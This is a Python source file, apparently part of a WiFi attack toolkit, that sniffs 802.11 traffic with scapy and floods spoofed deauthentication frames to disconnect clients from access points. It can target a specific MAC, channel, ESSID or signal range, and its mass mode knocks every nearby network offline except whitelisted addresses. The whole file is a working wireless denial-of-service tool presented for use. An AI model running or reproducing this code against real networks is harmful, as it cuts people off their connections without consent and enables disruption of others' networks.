# deauth.py
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, Dot11AssoReq, Dot11Auth, Dot11, Dot11Deauth, RadioTap, Dot11AssoResp, Dot11Disas, Dot11QoS
from scapy.layers.eap import EAPOL
import threading
import os
import time
from rich.console import Console
from rich.table import Table
from rich.live import Live

try:
    from FreewayTools.colors import cprint, iprint, wprint, cinput, ColorCodes
    from FreewayTools.monitor import get_signal_strength

except ModuleNotFoundError:
    from colors import cprint, iprint, wprint, cinput, ColorCodes
    from monitor import get_signal_strength

cc = ColorCodes()

class Processor:
    """Handles sniffed packets"""
    def __init__(self, interface, aps, clients, console, debug):
        self.debug = debug
        self.APs = aps
        self.interface = interface
        self.Clients = clients
        self.seen_networks = set()
        self.console = console 
        self.last_cl_mac = ""
        self.pairs = {}

    def extract_channel(self, packet):
        channel = "N/A"
        if packet.haslayer(RadioTap):
            try:
                channel = ord(packet[Dot11Elt:3].info)
            except Exception as e:
                if self.debug:
                    self.console.print(f"In function extract_channel: {type(e).__name__}: {str(e)}")
        return channel

    def entry_handler(self, packet):
        if stop_event.is_set():
            return
        """Prepares packet for pairs population"""
        if packet.haslayer(Dot11):
            ptype = self.get_packet_type(packet)

            if ptype == "Beacon":
                ap_mac = packet.addr2
                channel = self.extract_channel(packet)

                if ap_mac not in self.APs:
                    self.APs[ap_mac] = {"mac": ap_mac, "signal": get_signal_strength(packet), "channel": channel}
                
                ssid = packet[Dot11Elt].info.decode('utf-8', 'ignore') if packet[Dot11Elt].info else "Hidden SSID"
                
                if ssid is not None:
                    self.APs[ap_mac]["ssid"] = ssid
                    self.APs[ap_mac]["signal"] = get_signal_strength(packet)

                if ap_mac not in self.seen_networks:
                    self.seen_networks.add(ap_mac)
                    if self.debug:
                        self.console.print(f"Found new network {ap_mac} -- {ssid}", style="green")
                        print(self.pairs)
                return
            elif ptype == "Probe Request":
                cl_mac = packet.addr2
                if cl_mac == self.last_cl_mac:
                    return

                broadcast = packet.addr1

                if cl_mac != "FF:FF:FF:FF:FF:FF" and cl_mac not in self.Clients:
                    self.Clients[cl_mac] = {"mac": cl_mac, "signal": get_signal_strength(packet), "ssid": "Unknown"}
                if self.debug:
                    self.console.print(f"Found Probe Request from {cl_mac} TO {broadcast}", style="yellow")

                self.last_cl_mac = cl_mac
                return
            elif ptype == "Probe Response":
                cl_mac = packet.addr1
                ap_mac = packet.addr2
                ssid = f"{self.APs[ap_mac]['ssid']}: {ap_mac}" if ap_mac in self.APs else None
                
                if cl_mac not in self.Clients:
                    self.Clients[cl_mac] = {"mac": cl_mac, "signal": get_signal_strength(packet), "ssid": ssid if ssid else "Unknown"}
                if self.debug:
                    self.console.print(f"Found Probe Response from AP {ssid if ssid else ap_mac} TO: {cl_mac} / {packet}", style="yellow")
            elif ptype == "Association":
                cl_mac = packet.addr1
                ap_mac = packet.addr2
                ssid = f"{self.APs[ap_mac]['ssid']}: {ap_mac}" if ap_mac in self.APs else None
                if cl_mac not in self.Clients:
                    self.Clients[cl_mac] = {"mac": cl_mac, "signal": get_signal_strength(packet), "ssid": ssid if ssid else "Unknown"}
                if self.debug:
                    self.console.print(f"Found Asso Request from {ssid if ssid else ap_mac} TO: {cl_mac} / {packet}", style="blue")
            elif ptype == "Authentication":
                cl_mac = packet.addr1
                ap_mac = packet.addr2
                ssid = f"{self.APs[ap_mac]['ssid']}: {ap_mac}" if ap_mac in self.APs else None
                if cl_mac not in self.Clients:
                    self.Clients[cl_mac] = {"mac": cl_mac, "signal": get_signal_strength(packet), "ssid": ssid if ssid else "Unknown"}
                if self.debug:
                    self.console.print(f"Found Authentication Response from {ssid if ssid else ap_mac} TO: {cl_mac} / {packet}", style="green")
            else:
                if ptype in ["Other"]:
                    return
                cl_mac = packet.addr1 if ptype not in ["CTS", "RTS"] else packet[Dot11].addr2
                ap_mac = packet.addr2 if ptype not in ["CTS", "RTS"] else packet[Dot11].addr1
                ssid = f"{self.APs[ap_mac]['ssid']}: {ap_mac}" if ap_mac in self.APs else None
                if cl_mac not in self.Clients:
                    self.Clients[cl_mac] = {"mac": cl_mac, "signal": get_signal_strength(packet), "ssid": ssid if ssid else "Unknown"}
                if self.debug:
                    self.console.print(f"Found Packet with type {ptype} from {ssid if ssid else ap_mac} TO: {cl_mac} / {packet}", style="green")

            if cl_mac is not None and ap_mac is not None and cl_mac != ap_mac:
                self.populate_pairs(cl_mac, ap_mac)
    
    def get_packet_type(self, packet):
        """Determines the type of a WiFi packet."""
        if packet.haslayer(Dot11Beacon):
            return "Beacon"
        elif packet.haslayer(Dot11ProbeReq):
            return "Probe Request"
        elif packet.haslayer(Dot11ProbeResp):
            return "Probe Response"
        elif packet.haslayer(Dot11AssoReq) or packet.haslayer(Dot11AssoResp):
            return "Association"
        elif packet.haslayer(Dot11Auth):
            return "Authentication"
        elif packet.haslayer(Dot11Deauth):
            return "Deauthentication"
        elif packet.haslayer(Dot11Disas):
            return "Disassociation"
        elif packet.haslayer(Dot11QoS):
            return "QoS Data"
        else:
            if packet.type == 1:
                subtype = packet.subtype
                if subtype == 0x09:
                    return "Block Ack Req"
                elif subtype == 0x0b:
                    return "Block Ack"
                elif subtype == 0x0B:
                    return "RTS"
                elif subtype == 0x0C:
                    return "CTS"
            return "Other"

    def populate_pairs(self, cl_mac, ap_mac):
        if cl_mac in self.APs:
            return

        if "ff:ff:ff:ff:ff:ff" not in [cl_mac, ap_mac]:
            if cl_mac in self.pairs:
                self.pairs[cl_mac]['ap'] = ap_mac
                if ap_mac in self.APs:
                    self.pairs[cl_mac]['ssid'] = self.APs[ap_mac]['ssid']
                    self.pairs[cl_mac]['channel'] = self.APs[ap_mac]['channel']
            else:
                signal = self.APs[ap_mac]['signal'] if ap_mac in self.APs else -99
                ssid = self.APs[ap_mac]['ssid'] if ap_mac in self.APs else "Unknown"
                if ssid == "Unknown":
                    return
                channel = self.APs[ap_mac]['channel'] if ap_mac in self.APs else "N/A"
                self.pairs[cl_mac] = {
                    "ap": ap_mac,
                    "dframes": 0,
                    "signal": signal,
                    "timestamp": time.strftime("%H:%M"),
                    "ssid": ssid,
                    "channel": channel
                }

            if self.debug:
                self.console.print(f"Updated pairs dictionary: {self.pairs}", style="bright_yellow")

stop_event = threading.Event()

class DeauthWorker:
    """Deauthing process, takes pairs, crafts deauth packets and sends them"""
    def __init__(self, interface, processor, stop_event, ap_from_ap=False, mass_deauth=False, whitelist_data=None, target=None, channel=None, essid=None, drange=None):
        self.stop_event = stop_event
        self.interface = interface
        self.whitelist_data = whitelist_data
        self.processor = processor
        self.target = target
        self.channel = channel
        self.essid = essid
        self.range = drange
        self.ap_from_ap = ap_from_ap
        self.mass_deauth = mass_deauth
        self.thread_collector = {}

    def run(self):
        thread_started = False
        while not self.stop_event.is_set():
            try:
                if self.mass_deauth:
                    while not self.processor.APs:  
                        time.sleep(0.5)  
                    aps_list = list(self.processor.APs.keys())
                    for ap in aps_list:
                        if ap in self.whitelist_data:
                            continue

                        if ap not in self.thread_collector:
                            self.thread_collector[ap] = {"started": False}

                        if not self.thread_collector[ap]['started']:
                            threading.Thread(target=self.client_deauth_thread_, args=(ap,), daemon=True).start()
                            self.thread_collector[ap] = {"started": True}

                elif self.ap_from_ap:
                    if not thread_started:
                        threading.Thread(target=self.client_deauth_thread_, args=(self.target,), daemon=True).start()
                        thread_started = True
                else:
                    clients_list = list(self.processor.pairs.keys())
                    for client_mac in clients_list:
                        if client_mac in self.whitelist_data:
                            continue

                        if client_mac not in self.thread_collector:
                            self.thread_collector[client_mac] = {"started": False}
                        
                        if not self.thread_collector[client_mac]['started']:
                            threading.Thread(target=self.client_deauth_thread_, args=(client_mac,), daemon=True).start()
                            self.thread_collector[client_mac] = {"started": True}

            except OSError as e:
                wprint(f"Network error: {e}")
            except KeyboardInterrupt:
                break
            except Exception as e:
                wprint(f"Unexpected error: {e}")
                time.sleep(2)
            
    def client_deauth_thread_(self, client_mac):
        while not self.stop_event.is_set():
            try:

                if self.ap_from_ap:
                    self._deauth_("FF:FF:FF:FF:FF:FF", client_mac, self.interface)
                    continue
                elif self.mass_deauth:
                    self._deauth_("FF:FF:FF:FF:FF:FF", client_mac, self.interface)
                    continue

                details = self.processor.pairs.get(client_mac, {})
                ap_mac = details.get("ap")
                if ap_mac is None:
                    wprint("AP Mac is None!")
                    return
                channel = details.get("channel")
                ssid = details.get("ssid")
                signal = details.get("signal")
                if self.target is not None:
                    if ap_mac == self.target or client_mac == self.target:
                        self._deauth_(client_mac, ap_mac, self.interface, details)
                elif self.channel is not None:
                    if str(self.channel) == str(channel):
                        self._deauth_(client_mac, ap_mac, self.interface, details)
                elif self.essid is not None:
                    if str(self.essid) == str(ssid):
                        self._deauth_(client_mac, ap_mac, self.interface, details)
                elif self.range is not None:
                    if -int(self.range) < int(signal) if signal is not None else -99:
                        self._deauth_(client_mac, ap_mac, self.interface, details)
                else:
                    self._deauth_(client_mac, ap_mac, self.interface, details)

            except OSError as e:
                wprint(f"Network error: {e}")
            except Exception as e:
                wprint(f"Unexpected error: {e}")
                time.sleep(2)

    def _deauth_(self, client_mac, ap_mac, interface, pair=None):
        if self.mass_deauth:
            client_mac = "FF:FF:FF:FF:FF:FF"
        dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
        deauth = Dot11Deauth(reason=7)
        packet = RadioTap()/dot11/deauth
        iprint(f"Deauthing {client_mac} from {ap_mac}")  
        bullets = random.randint(25, 40)
        sendp(packet, iface=interface, count=bullets, inter=0.01, verbose=False)
        if pair:
            pair["dframes"] += bullets

class Deauth:
    def __init__(self, interface, parm):
        self.interface = interface
        self.parm = parm
        self.whitelist_data = []
        self.APs = {}
        self.Clients = {}
        self.console = Console()
        self.ap_from_ap = True if "7" in self.parm else False
        self.mass_deauth = True if "8" in self.parm else False
        self.debug = True if "9" in self.parm else False
        self.processor = Processor(self.interface, self.APs, self.Clients, self.console, self.debug)
        self.target = cinput("Enter target MAC").lower() if "1" in self.parm or "2" in self.parm or "7" in self.parm else None
        self.channel = cinput("Enter target channel") if "3" in self.parm else None
        self.essid = cinput("Enter target ESSID") if "4" in self.parm else None
        self.range = cinput("Enter max. range (number)") if "5" in self.parm else None
        self.whitelist = self.handle_whitelist() if "w" in self.parm else None

    def safecall(self, cmd):
        try:
            os.system(f'{cmd}')
        except Exception as e:
            if self.debug:
                self.console.print(f"Error when calling {cmd}")

    def handle_whitelist(self):
        w_path = "/usr/local/share/3way/whitelist.txt"
        print(f"{cc.RED}\tAddresses:")
        self.safecall("ifconfig | awk '/^[a-zA-Z]/ {iface=$1} /ether/ {print iface $2}'")        
        while True:
            mac_to_add = cinput("Add MAC Address to whitelist.txt (press Enter to skip)")
            if len(mac_to_add) == 17: 
                try:
                    with open(w_path, "a" if os.path.exists(w_path) else "w") as f:
                        f.write(f"{mac_to_add}\n")

                except Exception as e:
                    if self.debug:
                        self.console.print(f"Couldn't add {mac_to_add}, {e}")

            if mac_to_add == "":
                break
        
        try:
            with open(w_path, "r") as f:
                data = f.read()
                self.whitelist_data = data.split("\n")
                self.console.print(f"{self.whitelist_data}")

        except Exception as e:
            if self.debug:
                self.console.print(f"Couldn't read whitelist.txt, {str(e)}")

    def init_monitor_mode(self, mode="monitor"):
        try:
            for interface in self.interface:
                os.system(f'sudo iwconfig {interface} mode {mode}')
        except Exception as e:
            wprint(f"Error while putting interface in monitor mode: {e}")

    def sfilter(self, x):
        return True if stop_event.is_set() else False

    def start_sniff(self):
        while not stop_event.is_set():
            try:
                sniff(iface=self.interface, prn=self.processor.entry_handler, stop_filter=self.sfilter, store=0, monitor=True)
            except OSError as e:
                wprint(f"Network error: {e}")
                self.run_deauthy()

    def display_live_table(self):
        with Live(generate_table(self.processor.pairs.copy()), refresh_per_second=10, console=self.console) as live:  # Refresh 10 times per second
            while not stop_event.is_set():
                live.update(generate_table(self.processor.pairs.copy()), refresh=True)
                time.sleep(1)

    def run_deauthy(self):
        stop_event.clear()
        try:
            self.init_monitor_mode()
            for interface in self.interface:
                if self.target is not None:
                    deauth_worker = DeauthWorker(interface, self.processor, stop_event, self.ap_from_ap, self.mass_deauth, self.whitelist_data, target=self.target)
                elif self.channel is not None:
                    deauth_worker = DeauthWorker(interface, self.processor, stop_event, self.ap_from_ap, self.mass_deauth, self.whitelist_data, channel=self.channel)
                elif self.essid is not None:
                    deauth_worker = DeauthWorker(interface, self.processor, stop_event, self.ap_from_ap, self.mass_deauth, self.whitelist_data, essid=self.essid)
                elif self.range is not None:
                    deauth_worker = DeauthWorker(interface, self.processor, stop_event, self.ap_from_ap, self.mass_deauth, self.whitelist_data, drange=self.range)
                else:
                    deauth_worker = DeauthWorker(interface, self.processor, stop_event, self.ap_from_ap, self.mass_deauth, self.whitelist_data)
                    
                deauth_thread = threading.Thread(target=deauth_worker.run, daemon=True).start()

            if self.ap_from_ap:
                while True:
                    pass
                return

            sniff_thread = threading.Thread(target=self.start_sniff, daemon=True).start()
            self.display_live_table()

        except KeyboardInterrupt:
            stop_event.set()
            time.sleep(1)
        finally:
            self.init_monitor_mode(mode="managed")

def generate_table(pairs):
    table = Table()
    table.add_column("Access Point", style="magenta")
    table.add_column("Device", style="cyan")
    table.add_column("D. Frames", justify="right", style="green")
    table.add_column("  🌐  ", justify="center", style="green")
    table.add_column("L. Beacon", justify="right", style="green")
    table.add_column("ESSID", justify="right", style="blue")
    table.add_column("Channel", justify="right", style="yellow")

    for client_mac, pair in pairs.items():
        ap_mac = pair["ap"]
        client_mac = client_mac
        deauth_frames_count = pair["dframes"] if "dframes" in pair else 0
        signal = pair["signal"]
        timestamp = pair["timestamp"]
        ssid = pair["ssid"]
        channel = pair["channel"]
        table.add_row(ap_mac, client_mac, str(deauth_frames_count), str(signal) + "dbm", timestamp, ssid, str(channel))
    return table

if __name__ == "__main__":
    # For testing purposes
    Deauth(["wlan2"], parm={}).run_deauthy()